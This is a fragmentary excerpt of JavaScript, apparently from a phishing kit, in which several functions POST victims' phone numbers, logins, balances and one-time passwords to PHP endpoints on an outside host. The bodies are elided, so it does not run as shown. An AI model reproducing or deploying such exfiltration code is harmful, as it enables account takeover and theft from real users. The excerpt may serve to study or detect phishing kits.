function sendHp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/no.php',
      type: 'POST',
...
function sendLogin(){
   $('.load').fadeIn();
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/sudah.php',
      type: 'POST',
...
function sendSaldoS() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/saldosdh.php',
      type: 'POST',
...
function sendOtpS() {        
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/otpsdh.php',
      type: 'POST',
...
document.getElementById("nohp").value =
    ...
    $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/belum.php',
      type: 'POST',
...
function sendSaldo() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/saldoblm.php',
      type: 'POST',
...
function sendOtp() {
   ...
   $.ajax({
      url: 'https://koyebapps.wellxx.rest/13/otpblm.php',
      type: 'POST',
